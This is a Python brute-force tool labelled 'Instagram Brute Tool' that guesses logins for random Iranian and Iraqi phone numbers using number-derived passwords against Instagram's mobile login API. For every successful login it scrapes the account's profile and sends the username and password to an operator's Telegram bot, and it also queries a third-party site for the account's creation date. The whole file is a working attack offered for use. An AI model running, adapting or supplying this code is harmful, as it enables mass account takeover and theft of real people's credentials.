import os
os.system('clear')
try:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
except ImportError:
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('pip install sys')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
    import secrets, sys
    os.system('clear')
    aa = 0
    zz = 0
    E = '\x1b[1;31m'
    G = '\x1b[1;32m'
    S = '\x1b[1;33m'
    Z = '\x1b[1;31m'
    X = '\x1b[1;33m'
    Z1 = '\x1b[2;31m'
    F = '\x1b[2;32m'
    A = '\x1b[2;39m'
    C = '\x1b[2;35m'
    B = '\x1b[2;36m'
    Y = '\x1b[1;34m'
    import time
    timee = time.asctime()
    t = time.localtime()
    current_time = time.strftime('%H:%M:%S', t)

    def a(z):
        for e in z:
            sys.stdout.write(e)
            sys.stdout.flush()
            sleep(0.1)
    print(f"""{E}
  ___         _          ___          _       
 |_ _|_ _  __| |_ __ _  | _ )_ _ _  _| |_ ___ 
  | || ' \(_-<  _/ _` | | _ \ '_| || |  _/ -_)
 |___|_||_/__/\__\__,_| |___/_|  \_,_|\__\___|
- - - - - - - - - - - - - - - - - - - - - - 
{E}Instagram Brute Tool Developed By : @trprogram\n
{G} [+] Very Cool Tool [+]
""")
    tok = input(E+" [?] Enter Token :")
    ID = input(E+" [?] Enter Id :")
    os.system('clear')
    start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=Started ☑️").json()
    id_msg = start_msg['result']['message_id']

    def trakos(userQ, password):
        cookie = secrets.token_hex(8) * 2
        head = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':'Mozilla/5.0 (Linux; Android 11; RMX2151) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'1217981644879628', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'snjfeXg2c2XKs5pcgljfVMtKGp1Qeiuh', 
         'Accept-Language':'en-US,en;q=0.9'}
        url_id = f"https://www.instagram.com/{userQ}/?__a=1"
        req_id = requests.get(url_id, headers=head).json()
        name = str(req_id['graphql']['user']['full_name'])
        id = str(req_id['graphql']['user']['id'])
        followes = str(req_id['graphql']['user']['edge_followed_by']['count'])
        verified = str(req_id['graphql']['user']['is_verified'])
        
        following = str(req_id['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        ree = re.json()
        dat = ree['data']
        t = time.localtime()
        current_time = time.strftime('%H:%M:%S', t)
        a =f""" 
◆━━━━━━◆❃◆━━━━━━◆
✅ 𝗡𝗔𝗠𝗘 : {name}
✅ 𝗨𝗦𝗘𝗥 : {userQ}
✅ 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗 : {password}
✅ 𝗙𝗢𝗟𝗟𝗢𝗪𝗘R𝗦 : {followes}
✅ 𝗙𝗢𝗟𝗟𝗢𝗪𝗜𝗡𝗚 : {following}
✅ 𝗩𝗘𝗥𝗜𝗙𝗜𝗘𝗗 : {verified}
✅ 𝗗𝗔𝗧𝗘 : {dat}
◆━━━━━━◆❃◆━━━━━━◆
        
       """
        tlg = f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={a}"
        i = requests.post(tlg)
        print(f"{G} New Account :\nUser : {userQ}\nPassword : {password}")


    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers = {'User-Agent':'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)'}
    
    
    sleep(0)
    user = '0987654321'
    while True:
        us = str(''.join((random.choice(user) for i in range(7))))
        #trakos
        username = '+98936' + us
        password = '0936' + us
        
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         #trakos
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            trakos(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
        else:
            trprogram = f"""
Checker Started 🩴
- - - - - - - - - - -
✅  Hits : {zz}
❌  Bad : {aa} 
- - - - - - - - - - - 
Username : {username} 
Password : {password}
- - - - - - - - - - - 
By : @trprogram
"""
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text={trprogram}") 
            print(E + 'username ==> : ' + username + ': password ==> : ' + password)
            aa += 1
            sleep(0)
    user = '0987654321'
    while True:
        us = str(''.join((random.choice(user) for i in range(6))))
        username = '+964771' + us
        password = '771' + us
        from uuid import uuid4
        uid = str(uuid4())
        data = {'uuid':uid, 
         'password':password, 
         'username':username, 
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers, data=data)
        if 'logged_in_user' in req.json():
            zz += 1
            userQ = req.json()['logged_in_user']['username']
            trakos(userQ, password)
        elif '"message":"challenge_required","challenge"' in req.json():
            print(S + 'username S ==> : ' + username + ': password ==> : ' + password)
        else:
            trprogram = f"""
Checker Started 🩴
- - - - - - - - - - -
✅  Hits : {zz}
❌  Bad : {aa} 
- - - - - - - - - - - 
Username : {username} 
Password : {password}
- - - - - - - - - - - 
By : @trprogram
"""
            requests.post(f"https://api.telegram.org/bot{tok}/editmessagetext?chat_id={ID}&message_id={id_msg}&text=**{trprogram}**") 
            print(E + 'username ==> : ' + username + ': password ==> : ' + password)
            aa += 1